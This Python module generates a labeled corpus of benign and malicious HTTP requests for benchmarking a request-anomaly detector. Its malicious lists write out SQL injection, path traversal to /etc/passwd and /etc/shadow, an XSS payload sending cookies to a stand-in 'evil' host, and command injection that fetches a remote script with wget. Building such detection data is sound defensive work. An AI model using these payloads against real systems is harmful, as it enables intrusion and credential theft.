"""Labeled HTTP request corpus — ground truth for training and benchmarking.

We generate *raw requests* (method/url/body/headers/timing) rather than
hand-picked feature vectors, then run them through the real
``extract_features`` pipeline. This keeps the benchmark honest: the detector is
evaluated on exactly the transformation the live proxy applies.

- ``benign_requests`` — browser + API traffic with organic headers/timing.
- ``malicious_requests`` — the attack families the proxy defends against
  (SQLi, traversal, XSS, command injection, scanner recon, admin hunting),
  including URL/hex/unicode-obfuscated variants that evade the regex layer.

Both are deterministic given ``seed``.
"""

from __future__ import annotations

import numpy as np

from anomaly.feature_extractor import extract_features

# ── Benign building blocks ───────────────────────────────────────────────────

_BENIGN_PATHS = [
    "/", "/index.html", "/about", "/pricing", "/blog", "/blog/2026/launch",
    "/docs/getting-started", "/assets/app.css", "/assets/main.js",
    "/api/v1/products", "/api/v1/products?page=2", "/api/v1/users/me",
    "/search?q=laptop", "/search?q=running+shoes", "/cart", "/checkout",
    "/favicon.ico", "/robots.txt", "/images/hero.png", "/account/settings",
]

_BENIGN_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
]

_BENIGN_JSON_BODIES = [
    b'{"email":"user@example.com","remember":true}',
    b'{"query":"wireless headphones","page":1,"limit":20}',
    b'{"product_id":4821,"quantity":2}',
    b'{"first_name":"Jamie","last_name":"Rivera","newsletter":false}',
]

# ── Malicious building blocks ────────────────────────────────────────────────

_SQLI = [
    "/login?user=admin'--&pw=x",
    "/items?id=1' OR '1'='1",
    "/items?id=1 UNION SELECT username,password_hash FROM users--",
    "/report?year=2026;DROP TABLE sessions--",
    "/api/v1/products?id=1' AND SLEEP(5)--",
]
_TRAVERSAL = [
    "/static/../../../../etc/passwd",
    "/download?file=../../../../etc/shadow",
    "/view/..%2f..%2f..%2fetc%2fpasswd",      # URL-encoded
    "/assets/..\\..\\..\\windows\\win.ini",
]
_XSS = [
    "/search?q=<script>document.location='http://evil/'+document.cookie</script>",
    "/comment?text=<img src=x onerror=alert(1)>",
    "/profile?name=%3Cscript%3Ealert(1)%3C/script%3E",  # encoded
]
_CMDI = [
    "/ping?host=127.0.0.1;cat /etc/passwd",
    "/lookup?d=example.com|wget http://evil/x.sh",
    "/exec?cmd=%63%61%74%20/etc/shadow",   # hex-encoded "cat "
]
_SCAN_PATHS = ["/", "/admin", "/phpmyadmin", "/.env", "/config", "/wp-admin", "/.git/config"]
_SCANNER_UAS = ["sqlmap/1.8", "Nikto/2.5.0", "masscan/1.3", "Nmap Scripting Engine", "zgrab/0.x", "dirbuster"]


def _req(method: str, url: str, body: bytes, headers: dict, t: float) -> dict:
    return {
        "method": method,
        "url": url,
        "body": body,
        "content_length": len(body),
        "headers": headers,
        "request_times": [t - 1.0, t],  # supplies the timing feature
    }


def benign_requests(n: int, seed: int = 1) -> list[dict]:
    rng = np.random.default_rng(seed)
    out: list[dict] = []
    for _ in range(n):
        if rng.random() < 0.6:  # GET browse
            path = _BENIGN_PATHS[rng.integers(len(_BENIGN_PATHS))]
            method, body = "GET", b""
        else:  # POST API
            path = "/api/v1/" + ["login", "search", "cart/add", "account/update"][rng.integers(4)]
            method = "POST"
            body = _BENIGN_JSON_BODIES[rng.integers(len(_BENIGN_JSON_BODIES))]
        headers = {
            "host": "shop.example.com",
            "user-agent": _BENIGN_UAS[rng.integers(len(_BENIGN_UAS))],
            "accept": "text/html,application/xhtml+xml,application/json",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "connection": "keep-alive",
        }
        if method == "POST":
            headers["content-type"] = "application/json"
        # organic spacing: 1.5–6 s between requests
        gap = float(rng.uniform(1.5, 6.0))
        out.append(_req(method, path, body, headers, 1000.0 + gap))
    return out


def malicious_requests(n: int, seed: int = 2) -> list[dict]:
    rng = np.random.default_rng(seed)
    families = [_SQLI, _TRAVERSAL, _XSS, _CMDI]
    out: list[dict] = []
    for _ in range(n):
        roll = rng.random()
        if roll < 0.25:  # scanner recon — stub UA, sparse headers, bursty
            path = _SCAN_PATHS[rng.integers(len(_SCAN_PATHS))]
            headers = {"host": "shop.example.com", "user-agent": _SCANNER_UAS[rng.integers(len(_SCANNER_UAS))]}
            body = b""
            method = "GET"
        else:
            fam = families[rng.integers(len(families))]
            url = fam[rng.integers(len(fam))]
            method = "GET" if "?" in url or rng.random() < 0.5 else "POST"
            body = url.split("?", 1)[1].encode() if (method == "POST" and "?" in url) else b""
            path = url.split("?", 1)[0] if method == "POST" and body else url
            headers = {"host": "shop.example.com", "user-agent": _SCANNER_UAS[rng.integers(len(_SCANNER_UAS))] if rng.random() < 0.4 else "curl/8.4.0"}
            method = method
        # automated bursts: 0–0.4 s spacing
        gap = float(rng.uniform(0.0, 0.4))
        out.append(_req(method, path, body, headers, 1000.0 + gap))
    return out


def features_from_request(req: dict, session_content_lengths: list[int] | None = None) -> np.ndarray:
    """Run a raw corpus/proxy request dict through the canonical extractor."""
    return extract_features(
        req["method"],
        req["url"],
        req["body"],
        req["content_length"],
        session_content_lengths if session_content_lengths is not None else [],
        headers=req.get("headers"),
        request_times=req.get("request_times"),
    )


def labeled_feature_set(
    n_benign: int, n_malicious: int, seed: int = 7
) -> tuple[np.ndarray, np.ndarray]:
    """Return (X, y) with y=0 benign, y=1 malicious — for benchmark/calibration."""
    benign = benign_requests(n_benign, seed=seed)
    malicious = malicious_requests(n_malicious, seed=seed + 1)
    X = np.vstack(
        [features_from_request(r) for r in benign]
        + [features_from_request(r) for r in malicious]
    )
    y = np.concatenate([np.zeros(len(benign)), np.ones(len(malicious))])
    return X.astype(np.float32), y.astype(int)
